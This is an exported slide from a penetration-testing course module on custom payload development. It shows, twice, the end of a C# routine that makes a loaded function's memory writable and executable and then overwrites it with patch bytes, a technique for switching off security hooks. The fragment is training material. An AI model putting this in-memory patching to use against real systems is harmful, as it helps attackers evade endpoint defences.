(function(){var loadHandler=window['sl_{9B7E1ACD-FE32-41D7-8304-031CE5D38424}'];loadHandler&&loadHandler(258, '<div id="spr0_a469d"><div id="spr1_a469d" class="kern slide"><img id="img2_a469d" src="data/img3.png" width="960px" height="540px" alt="" style="left:0px;top:0px;"/><a id="hl0_a469d" href="#" onclick="document.getElementById(\'coreSpr_588484\').getCore().processTriggerEffect(this);document.getElementById(\'coreSpr_588484\').getCore().gotoSlide(1, this);return false;" style="left:905.506px;top:222px;"><div id="svg3_a469d" style="left:0px;top:0px;"><svg width="55" height="40" viewBox="0 0 55 40"><path fill="#bbe0e3" fill-opacity="0" d="M0,0 h54.494 v40 h-54.494 Z"/></svg></div></a><div id="spr3_a469d" style="left:905.506px;top:222px;"><div style="width:0px;"><a id="hl1_a469d" href="#" onclick="document.getElementById(\'coreSpr_588484\').getCore().processTriggerEffect(this);document.getElementById(\'coreSpr_588484\').getCore().gotoSlide(1, this);return false;"><span id="txt0_a469d" style="left:9.6px;top:1.764px;">d</span></a></div></div><a id="hl2_a469d" href="#" onclick="document.getElementById(\'coreSpr_588484\').getCore().processTriggerEffect(this);document.getElementById(\'coreSpr_588484\').getCore().gotoSlide(326, this);return false;" style="left:905.506px;top:272.055px;"><div id="svg4_a469d" style="left:0px;top:0px;"><svg width="55" height="30" viewBox="0 0 55 30"><path fill="#bbe0e3" fill-opacity="0" d="M0,0 h54.494 v29.081 h-54.494 Z"/></svg></div></a><div id="spr4_a469d" style="left:905.506px;top:272.055px;"><div style="width:0px;"><a id="hl3_a469d" href="#" onclick="document.getElementById(\'coreSpr_588484\').getCore().processTriggerEffect(this);document.getElementById(\'coreSpr_588484\').getCore().gotoSlide(326, this);return false;"><span id="txt1_a469d" style="left:9.6px;top:2.776px;">d</span></a></div></div><div id="spr5_a469d" style="left:464px;top:504.919px;"><div style="width:0px;"><span id="txt2_a469d" class="nokern" data-width="300.722656" style="left:73.433px;top:4.798px;">PTXv2: Section 4, Module 1 - Caendra Inc. © 2020</span></div></div><div id="svg5_a469d" style="left:31.3px;top:501.094px;"><svg width="875" height="6" viewBox="-2.667 -1.333 875 6"><g fill="#c00000" stroke="none"><path stroke="#c00000" stroke-width="2.667" stroke-linecap="butt" transform="translate(-33.966309,-502.427063)" d="M33.966,503.76 H903.354"/></g></svg></div><a id="hl4_a469d" href="#" onclick="document.getElementById(\'coreSpr_588484\').getCore().processTriggerEffect(this);document.getElementById(\'coreSpr_588484\').getCore().gotoSlide(1, this);return false;" style="left:905.506px;top:222px;"><div id="svg8_a469d" style="left:0px;top:0px;"><svg width="55" height="40" viewBox="0 0 55 40"><path fill="#bbe0e3" fill-opacity="0" d="M0,0 h54.494 v40 h-54.494 Z"/></svg></div></a><div id="spr6_a469d" style="left:905.506px;top:222px;"><div style="width:0px;"><a id="hl5_a469d" href="#" onclick="document.getElementById(\'coreSpr_588484\').getCore().processTriggerEffect(this);document.getElementById(\'coreSpr_588484\').getCore().gotoSlide(1, this);return false;"><span id="txt3_a469d" style="left:9.6px;top:1.764px;">d</span></a></div></div><a id="hl6_a469d" href="#" onclick="document.getElementById(\'coreSpr_588484\').getCore().processTriggerEffect(this);document.getElementById(\'coreSpr_588484\').getCore().gotoSlide(326, this);return false;" style="left:905.506px;top:272.055px;"><div id="svg9_a469d" style="left:0px;top:0px;"><svg width="55" height="30" viewBox="0 0 55 30"><path fill="#bbe0e3" fill-opacity="0" d="M0,0 h54.494 v29.081 h-54.494 Z"/></svg></div></a><div id="spr7_a469d" style="left:905.506px;top:272.055px;"><div style="width:0px;"><a id="hl7_a469d" href="#" onclick="document.getElementById(\'coreSpr_588484\').getCore().processTriggerEffect(this);document.getElementById(\'coreSpr_588484\').getCore().gotoSlide(326, this);return false;"><span id="txt4_a469d" style="left:9.6px;top:2.776px;">d</span></a></div></div></div><div id="spr2_a469d" class="kern slide"><div id="spr8_a469d" style="left:63.75px;top:117.75px;"><div style="width:0px;"><span id="txt5_a469d" class="nokern" data-width="210.034180" style="left:20.444px;top:16.745px;">            // Get function address</span></div><div style="width:0px;"><span id="txt6_a469d" class="nokern" data-width="432.070313" style="left:20.444px;top:30.986px;">            IntPtr functionPtr = Win32.GetProcAddress(libPtr, function);</span></div><div style="width:0px;"><span id="txt7_a469d" class="nokern" data-width="396.064453" style="left:20.444px;top:45.386px;">            // Jump to the real function address if offset is used</span></div><div style="width:0px;"><span id="txt8_a469d" class="nokern" data-width="168.027344" style="left:20.444px;top:59.786px;">            if (offset != 0)</span></div><div style="width:0px;"><span id="txt9_a469d" class="nokern" data-width="78.012695" style="left:20.444px;top:74.186px;">            {</span></div><div style="width:0px;"><span id="txt10_a469d" class="nokern" data-width="438.071289" style="left:20.444px;top:88.586px;">                functionPtr = new IntPtr(functionPtr.ToInt64() + offset);</span></div><div style="width:0px;"><span id="txt11_a469d" class="nokern" data-width="762.124023" style="left:20.444px;top:102.986px;">                Console.WriteLine(&quot;[&gt;] {0} + 0x{1} address: 0x{2}&quot;, function, offset.ToString(&quot;X&quot;), functionPtr.ToString(&quot;X&quot;));</span></div><div style="width:0px;"><span id="txt12_a469d" class="nokern" data-width="78.012695" style="left:20.444px;top:117.386px;">            }</span></div><div style="width:0px;"><span id="txt13_a469d" class="nokern" data-width="612.099609" style="left:20.444px;top:131.786px;">            else { Console.WriteLine(&quot;[&gt;] {0} address: 0x{1}&quot;, function, functionPtr.ToString(&quot;X&quot;)); }</span></div><div style="width:0px;"><span id="txt14_a469d" class="nokern" data-width="396.064453" style="left:20.444px;top:146.186px;">            // Change memory permissions to PAGE_EXECUTE_READWRITE</span></div><div style="width:0px;"><span id="txt15_a469d" class="nokern" data-width="546.088867" style="left:20.444px;top:160.586px;">            Win32.VirtualProtect(functionPtr, (UIntPtr)patch.Length, 0x40, out oldProtect);</span></div><div style="width:0px;"><span id="txt16_a469d" class="nokern" data-width="174.028320" style="left:20.444px;top:174.986px;">            // Patch function</span></div><div style="width:0px;"><span id="txt17_a469d" class="nokern" data-width="372.060547" style="left:20.444px;top:189.386px;">            Marshal.Copy(patch, 0, functionPtr, patch.Length);</span></div><div style="width:0px;"><span id="txt18_a469d" class="nokern" data-width="246.040039" style="left:20.444px;top:203.786px;">            // Restore memory permissions</span></div><div style="width:0px;"><span id="txt19_a469d" class="nokern" data-width="582.094727" style="left:20.444px;top:218.186px;">            Win32.VirtualProtect(functionPtr, (UIntPtr)patch.Length, oldProtect, out newProtect);</span></div><div style="width:0px;"><span id="txt20_a469d" class="nokern" data-width="228.037109" style="left:20.444px;top:232.586px;">            Win32.FreeLibrary(libPtr);</span></div><div style="width:0px;"><span id="txt21_a469d" class="nokern" data-width="288.046875" style="left:20.444px;top:246.986px;">            Console.WriteLine(&quot;[+] Patch Done&quot;);</span></div><div style="width:0px;"><span id="txt22_a469d" class="nokern" data-width="54.008789" style="left:20.444px;top:261.386px;">        }</span></div><div style="width:0px;"><span id="txt23_a469d" class="nokern" data-width="162.026367" style="left:20.444px;top:275.786px;">        catch (Exception e)</span></div><div style="width:0px;"><span id="txt24_a469d" class="nokern" data-width="54.008789" style="left:20.444px;top:290.186px;">        {</span></div><div style="width:0px;"><span id="txt25_a469d" class="nokern" data-width="318.051758" style="left:20.444px;top:304.586px;">            Console.WriteLine(&quot; [!] {0}&quot;, e.Message);</span></div><div style="width:0px;"><span id="txt26_a469d" class="nokern" data-width="360.058594" style="left:20.444px;top:318.986px;">            Console.WriteLine(&quot; [!] {0}&quot;, e.InnerException);</span></div><div style="width:0px;"><span id="txt27_a469d" class="nokern" data-width="54.008789" style="left:20.444px;top:333.386px;">        }</span></div><div style="width:0px;"><span id="txt28_a469d" class="nokern" data-width="30.004883" style="left:20.444px;top:347.786px;">    }</span></div><div style="width:0px;"><span id="txt29_a469d" class="nokern" style="left:20.444px;top:362.186px;">}</span></div></div><div id="spr9_a469d" style="left:63.75px;top:117.75px;"><img id="img0_a469d" src="data/img134.png" width="840" height="390" alt=""/></div><div id="spr10_a469d" style="left:63.75px;top:117.75px;"><div style="width:0px;"><span id="txt30_a469d" class="nokern" data-width="210.034180" style="left:17.616px;top:13.916px;">            // Get function address</span></div><div style="width:0px;"><span id="txt31_a469d" class="nokern" data-width="432.070313" style="left:17.616px;top:28.157px;">            IntPtr functionPtr = Win32.GetProcAddress(libPtr, function);</span></div><div style="width:0px;"><span id="txt32_a469d" class="nokern" data-width="396.064453" style="left:17.616px;top:42.557px;">            // Jump to the real function address if offset is used</span></div><div style="width:0px;"><span id="txt33_a469d" class="nokern" data-width="168.027344" style="left:17.616px;top:56.957px;">            if (offset != 0)</span></div><div style="width:0px;"><span id="txt34_a469d" class="nokern" data-width="78.012695" style="left:17.616px;top:71.357px;">            {</span></div><div style="width:0px;"><span id="txt35_a469d" class="nokern" data-width="438.071289" style="left:17.616px;top:85.757px;">                functionPtr = new IntPtr(functionPtr.ToInt64() + offset);</span></div><div style="width:0px;"><span id="txt36_a469d" class="nokern" data-width="762.124023" style="left:17.616px;top:100.157px;">                Console.WriteLine(&quot;[&gt;] {0} + 0x{1} address: 0x{2}&quot;, function, offset.ToString(&quot;X&quot;), functionPtr.ToString(&quot;X&quot;));</span></div><div style="width:0px;"><span id="txt37_a469d" class="nokern" data-width="78.012695" style="left:17.616px;top:114.557px;">            }</span></div><div style="width:0px;"><span id="txt38_a469d" class="nokern" data-width="612.099609" style="left:17.616px;top:128.957px;">            else { Console.WriteLine(&quot;[&gt;] {0} address: 0x{1}&quot;, function, functionPtr.ToString(&quot;X&quot;)); }</span></div><div style="width:0px;"><span id="txt39_a469d" class="nokern" data-width="396.064453" style="left:17.616px;top:143.357px;">            // Change memory permissions to PAGE_EXECUTE_READWRITE</span></div><div style="width:0px;"><span id="txt40_a469d" class="nokern" data-width="546.088867" style="left:17.616px;top:157.757px;">            Win32.VirtualProtect(functionPtr, (UIntPtr)patch.Length, 0x40, out oldProtect);</span></div><div style="width:0px;"><span id="txt41_a469d" class="nokern" data-width="174.028320" style="left:17.616px;top:172.157px;">            // Patch function</span></div><div style="width:0px;"><span id="txt42_a469d" class="nokern" data-width="372.060547" style="left:17.616px;top:186.557px;">            Marshal.Copy(patch, 0, functionPtr, patch.Length);</span></div><div style="width:0px;"><span id="txt43_a469d" class="nokern" data-width="246.040039" style="left:17.616px;top:200.957px;">            // Restore memory permissions</span></div><div style="width:0px;"><span id="txt44_a469d" class="nokern" data-width="582.094727" style="left:17.616px;top:215.357px;">            Win32.VirtualProtect(functionPtr, (UIntPtr)patch.Length, oldProtect, out newProtect);</span></div><div style="width:0px;"><span id="txt45_a469d" class="nokern" data-width="228.037109" style="left:17.616px;top:229.757px;">            Win32.FreeLibrary(libPtr);</span></div><div style="width:0px;"><span id="txt46_a469d" class="nokern" data-width="288.046875" style="left:17.616px;top:244.157px;">            Console.WriteLine(&quot;[+] Patch Done&quot;);</span></div><div style="width:0px;"><span id="txt47_a469d" class="nokern" data-width="54.008789" style="left:17.616px;top:258.557px;">        }</span></div><div style="width:0px;"><span id="txt48_a469d" class="nokern" data-width="162.026367" style="left:17.616px;top:272.957px;">        catch (Exception e)</span></div><div style="width:0px;"><span id="txt49_a469d" class="nokern" data-width="54.008789" style="left:17.616px;top:287.357px;">        {</span></div><div style="width:0px;"><span id="txt50_a469d" class="nokern" data-width="318.051758" style="left:17.616px;top:301.757px;">            Console.WriteLine(&quot; [!] {0}&quot;, e.Message);</span></div><div style="width:0px;"><span id="txt51_a469d" class="nokern" data-width="360.058594" style="left:17.616px;top:316.157px;">            Console.WriteLine(&quot; [!] {0}&quot;, e.InnerException);</span></div><div style="width:0px;"><span id="txt52_a469d" class="nokern" data-width="54.008789" style="left:17.616px;top:330.557px;">        }</span></div><div style="width:0px;"><span id="txt53_a469d" class="nokern" data-width="30.004883" style="left:17.616px;top:344.957px;">    }</span></div><div style="width:0px;"><span id="txt54_a469d" class="nokern" style="left:17.616px;top:359.357px;">}</span></div></div><img id="img1_a469d" src="data/img19.png" width="23.25" height="20.25" alt="" style="left:60.11px;top:117.255px;"/><div id="spr11_a469d" style="left:832.34px;top:504.755px;"><div style="width:0px;"><span id="txt55_a469d" class="nokern" data-width="44.342445" style="left:9.6px;top:4.798px;">|  p.259</span></div></div><div id="spr12_a469d" style="left:34.91px;top:6px;"><div style="width:0px;"><span id="txt56_a469d" data-width="611.057983" style="left:9.6px;top:27.438px;">1.11 Custom Payload Development</span></div></div></div></div>');})();